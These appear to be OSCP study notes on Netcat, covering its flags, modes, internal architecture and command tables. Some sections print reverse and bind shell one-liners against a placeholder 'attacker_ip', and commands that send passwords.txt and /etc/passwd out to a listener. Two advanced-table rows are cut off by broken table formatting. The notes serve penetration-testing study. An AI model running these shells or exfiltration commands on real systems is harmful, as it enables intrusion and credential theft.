___
## Netcat
**Netcat (nc)** is a lightweight networking utility originally written by **Hobbit (1995)**. It is commonly known as the:

> "Swiss Army Knife of Networking"

because it can create almost any type of TCP/UDP connection and interact directly with network services.

Unlike specialized tools such as Nmap or Metasploit, Netcat does not automatically scan, exploit, or enumerate. Instead, it provides a **raw communication channel** between systems.

### Purpose and Real-World Usage
| Purpose           | Description                           |
| ----------------- | ------------------------------------- |
| Network testing   | Test TCP/UDP connectivity             |
| Port checking     | Verify whether a service is reachable |
| Banner grabbing   | Identify running services             |
| File transfer     | Transfer files between systems        |
| Remote shells     | Create command shells over networks   |
| Debugging         | Troubleshoot network applications     |
| Proxying          | Forward traffic between ports         |
| Listener creation | Wait for incoming connections         |
#### Important Terms
| Term                       | Crisp Explanation                                                                                                      |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| **Quick Port Testing**     | Checks whether a specific network port is **open and reachable**.                                                      |
| **Banner Grabbing**        | Connects to a service and reads its **banner/initial response** to identify the service or version.                    |
| **File Transfer**          | Sends or receives **files/data between two systems** through a network connection.                                     |
| **Reverse Shell**          | A shell where the **remote system connects back** to the operator's listening system.                                  |
| **Large Scans**            | Scanning **many hosts or ports** systematically; Netcat is inefficient for this, so tools like Nmap are preferred.     |
| **Vulnerability Scanning** | Automatically checking systems/services for **known security weaknesses**; Netcat does not perform this automatically. |
| **Web Testing**            | Manually interacting with **HTTP/HTTPS services** and inspecting responses; Netcat provides only basic functionality.  |
#### When to Use Netcat
| Situation              | Use Netcat?   |
| ---------------------- | ------------- |
| Quick port testing     | Yes           |
| Banner grabbing        | Yes           |
| File transfer          | Yes           |
| Reverse shells         | Yes           |
| Large scans            | No (use Nmap) |
| Vulnerability scanning | No            |
| Web testing            | Limited       |

### Normal Working Process
Netcat works using the client-server model.

Example:
```
Client  -------------------->  Server
        TCP Connection
```

**Two modes exist:**
#### 1. Client Mode
Netcat connects to an existing service.

Example:
```
nc 10.10.10.50 80
```

**Process:**
1. Resolve target IP
2. Create TCP socket
3. Send SYN packet
4. Complete TCP handshake
5. Exchange data
#### 2. Listener Mode
Netcat waits for incoming connections.

Example:
Attacker machine:
```
nc -lvnp 4444
```

Victim:
```
nc attacker_ip 4444
```

**Process:**
1. Netcat opens local socket
2. Binds to selected port
3. Waits using listen()
4. Accepts incoming connection
5. Transfers data

# Netcat Internal Architecture
### Stepwise Approach
|  Step | Component                   | What Happens                                                      | Key Details                                                                                                                    |
| ----: | --------------------------- | ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **1** | **Argument Parser**         | Reads the command and determines how Netcat should operate.       | Processes options such as `-l` (listen), `-u` (UDP), `-p` (port), and the target host/port. Determines **client/server mode**. |
| **2** | **Socket Manager**          | Creates and configures the network socket.                        | Creates a **TCP or UDP socket** and configures the IP address and port.                                                        |
| **3** | **Connection Handler**      | Establishes or accepts the connection.                            | **Client:** connects to the remote host.<br>**Server:** binds to a port, listens, and accepts connections.                     |
| **4** | **Protocol Handler**        | Handles communication over the established socket.                | Manages **TCP/UDP data exchange** and passes data between the socket and I/O layer.                                            |
| **5** | **Input/Output Handler**    | Moves data between local input/output and the network.            | `stdin → network` and `network → stdout`.                                                                                      |
| **6** | **File Transfer Module**    | Redirects streams for file-based communication.                   | Supports flows such as **file → network** and **network → file**.                                                              |
| **7** | **Data Transfer / Session** | Continuously transfers data until the connection or process ends. | Acts as a **bridge between local I/O and the network socket**.                                                                 |

![[Pasted image 20260911075051.png]]

## Security & OSCP Relevance
#### Why Netcat Matters in Cybersecurity
Netcat is extremely important because many OSCP situations require manual network interaction.

Common OSCP usage:
- Checking open ports
- Connecting to unknown services
- Transferring exploits
- Creating shells
- Pivoting
- Debugging connections

### How Attackers Use Netcat
Attackers commonly use:

> [!h1] #### 1. Reverse Shell
> Victim:
> ```bash
> nc attacker_ip 4444 -e /bin/bash
> ```
> 
> Attacker:
> ```bash
> nc -lvnp 4444
> ```
> 
> Result:
> ```
> Attacker <---- Victim Shell
> ```

> [!h1] #### 2. Bind Shell
> 
> Victim listens:
> ```bash
> nc -lvnp 4444 -e /bin/bash
> ```
> 
> Attacker connects:
> ```bash
> nc victim_ip 4444
> ```

> [!h1] #### 3. Data Exfiltration
> 
> Example:
> ```bash
> nc attacker_ip 4444 < passwords.txt
> ```

> [!h1] #### 4. Port Forwarding
> > Forward traffic between systems.

### OSCP Exam Relevance
| Scenario             | Usage                 |
| -------------------- | --------------------- |
| Initial enumeration  | Test services         |
| Exploitation         | Receive shells        |
| Privilege escalation | Transfer files        |
| Post exploitation    | Data movement         |
| Pivoting             | Network communication |
### Defensive Considerations
| Action                    | Reason                     |
| ------------------------- | -------------------------- |
| Monitor unusual listeners | Detect backdoors           |
| Block unnecessary ports   | Reduce attack surface      |
| Monitor outbound traffic  | Detect reverse shells      |
| Use IDS signatures        | Detect suspicious nc usage |
| Restrict binaries         | Prevent misuse             |

### Common Mistakes
| Mistake                               | Problem             |
| ------------------------------------- | ------------------- |
| Using nc instead of Nmap for scanning | Poor enumeration    |
| Forgetting `-n`                       | Slow DNS lookups    |
| No verbose mode                       | Missing information |
| Using insecure shells                 | Detection risk      |
| Leaving listeners open                | Security risk       |
### OSCP Golden Rules

Remember:

```
Nmap discovers
Netcat connects
Metasploit exploits
Shells provide access
```

___

# Command Structure and Application 
## Important Netcat Flags & Options Reference
| Flag / Option | Purpose                          | Example Usage                |
| ------------- | -------------------------------- | ---------------------------- |
| `-l`          | Listen mode                      | `nc -l 4444`                 |
| `-v`          | Verbose output                   | `nc -v target 80`            |
| `-vv`         | Very verbose                     | `nc -vv target 80`           |
| `-n`          | Disable DNS resolution           | `nc -nv 10.10.10.50 80`      |
| `-p`          | Local port                       | `nc -lp 4444`                |
| `-u`          | Use UDP instead of TCP           | `nc -u target 53`            |
| `-z`          | Scan mode (no data transfer)     | `nc -zv target 1-1000`       |
| `-w`          | Timeout                          | `nc -w 5 target 80`          |
| `-e`          | Execute program after connection | `nc -e /bin/bash`            |
| `-c`          | Execute command                  | `nc -c bash target 4444`     |
| `-q`          | Quit after EOF                   | `nc -q 5 target 80`          |
| `-k`          | Keep listener alive              | `nc -lk 4444`                |
| `-s`          | Specify source IP                | `nc -s 10.10.10.5 target 80` |
| `-G`          | TCP connect timeout              | `nc -G 5 target 80`          |
| `-4`          | IPv4 only                        | `nc -4 target 80`            |
| `-6`          | IPv6 only                        | `nc -6 target 80`            |

## Beginner Netcat Commands
| Purpose                 | Command                       | Example                           | One-line Explanation                                                               |
| ----------------------- | ----------------------------- | --------------------------------- | ---------------------------------------------------------------------------------- |
| Connect to TCP service  | `nc <TARGET> <PORT>`          | `nc 10.10.10.50 80`               | Connects manually to a TCP service and allows direct interaction with the service. |
| Check port availability | `nc -zv <TARGET> <PORT>`      | `nc -zv 10.10.10.50 22`           | Checks whether a specific TCP port is open without sending data.                   |
| Scan multiple ports     | `nc -zv <TARGET> <START-END>` | `nc -zv 10.10.10.50 1-1000`       | Performs a basic TCP port scan to identify reachable services.                     |
| Enable verbose output   | `nc -v <TARGET> <PORT>`       | `nc -v example.com 80`            | Displays detailed connection information for troubleshooting and enumeration.      |
| Use UDP mode            | `nc -u <TARGET> <PORT>`       | `nc -u 10.10.10.50 53`            | Communicates with UDP-based services instead of TCP services.                      |
| Start a listener        | `nc -l <PORT>`                | `nc -l 4444`                      | Opens a listening socket waiting for incoming connections.                         |
| Start verbose listener  | `nc -lv <PORT>`               | `nc -lv 4444`                     | Creates a listener and displays connection details.                                |
| Banner grabbing         | `nc <TARGET> <PORT>`          | `nc 10.10.10.50 22`               | Connects to a service to identify software versions and banners.                   |
| Receive a file          | `nc -l <PORT> > <FILE>`       | `nc -l 4444 > notes.txt`          | Receives network data and saves it into a file.                                    |
| Send a file             | `nc <TARGET> <PORT> < <FILE>` | `nc 10.10.10.5 4444 < exploit.py` | Sends a file to another system over a TCP connection.                              |
| Test HTTP service       | `nc <TARGET> 80`              | `nc example.com 80`               | Allows manual communication with an HTTP server.                                   |
| Check SSH service       | `nc <TARGET> 22`              | `nc 10.10.10.50 22`               | Checks SSH availability and retrieves service information.                         |

## Intermediate Netcat Commands
| Purpose                   | Command                                       | Example                                 | One-line Explanation                                     |
| ------------------------- | --------------------------------------------- | --------------------------------------- | -------------------------------------------------------- |
| Keep listener alive       | `nc -lk <PORT>`                               | `nc -lk 4444`                           | Keeps the listener running after a connection closes.    |
| Add connection timeout    | `nc -w <SECONDS> <TARGET> <PORT>`             | `nc -w 5 10.10.10.50 80`                | Limits how long Netcat waits for a connection.           |
| UDP port scanning         | `nc -uzv <TARGET> <PORT>`                     | `nc -uzv 10.10.10.50 161`               | Performs basic UDP service checking.                     |
| Disable DNS resolution    | `nc -nv <TARGET> <PORT>`                      | `nc -nv 10.10.10.50 80`                 | Speeds up connections by preventing reverse DNS lookups. |
| Specify source IP         | `nc -s <SOURCE-IP> <TARGET> <PORT>`           | `nc -s 10.10.10.20 10.10.10.50 80`      | Selects the local IP address used for communication.     |
| Send command output       | `<COMMAND> \| nc <TARGET> <PORT>`             | `cat /etc/passwd \| nc 10.10.10.5 4444` | Sends command output to a remote Netcat listener.        |
| Receive command output    | `nc -l <PORT>`                                | `nc -l 4444`                            | Receives remote data sent through a Netcat connection.   |
| Manual SMTP testing       | `nc <TARGET> 25`                              | `nc 10.10.10.50 25`                     | Interacts directly with SMTP services for enumeration.   |
| Manual HTTP request       | `nc <TARGET> 80`                              | `nc 10.10.10.50 80`                     | Sends custom HTTP requests without a browser.            |
| Check service response    | `nc -vv <TARGET> <PORT>`                      | `nc -vv 10.10.10.50 21`                 | Provides detailed service connection information.        |
| Transfer compressed files | `tar czf - <DIRECTORY> \| nc <TARGET> <PORT>` | `tar czf - tools \| nc 10.10.14.5 4444` | Transfers directories as compressed streams.             |
| Receive compressed files  | `nc -l <PORT> \| tar xzf -`                   | `nc -l 4444 \| tar xzf -`               | Receives and extracts transferred archives.              |

## Advance Netcat Commands
|Purpose|Command|Example|One-line Explanation|
|---|---|---|---|
|Create reverse shell listener|`nc -lvnp <PORT>`|`nc -lvnp 4444`|Opens a listener to receive an incoming reverse shell.|
|Create reverse shell connection|`nc <ATTACKER-IP> <PORT> -e <SHELL>`|`nc 10.10.14.5 4444 -e /bin/bash`|Connects back to an attacker and provides shell access.|
|Create bind shell listener|`nc -lvnp <PORT> -e <SHELL>`|`nc -lvnp 4444 -e /bin/bash`|Opens a shell on the target waiting for remote connection.|
|Connect to bind shell|`nc <TARGET> <PORT>`|`nc 10.10.10.50 4444`|Connects to a target-hosted shell.|
|Execute command after connection|`nc -e <PROGRAM> <TARGET> <PORT>`|`nc -e /bin/sh 10.10.14.5 4444`|Executes a program when the connection is established.|
|Use persistent listener|`nc -k -lvnp <PORT>`|`nc -k -lvnp 5555`|Keeps a listener active for multiple connections.|
|Transfer entire directory|`tar cf -|nc `|`tar cf - scripts|
|Port forwarding relay|`nc -l|nc `|`nc -l 8080|
|Capture incoming data|`nc -l <PORT> > <OUTPUT-FILE>`|`nc -l 5555 > loot.zip`|Captures transmitted data for later analysis.|
|Send data stream|`nc <TARGET> <PORT> < <INPUT-FILE>`|`nc 10.10.14.5 5555 < database.sql`|Sends raw data streams between systems.|
|Use Netcat for pivot testing|`nc <INTERNAL-IP> <PORT>`|`nc 192.168.1.50 445`|Tests access to internal network services during pivoting.|
|Debug custom services|`nc -vv <TARGET> <PORT>`|`nc -vv 10.10.10.50 31337`|Helps analyze unknown services and custom applications.|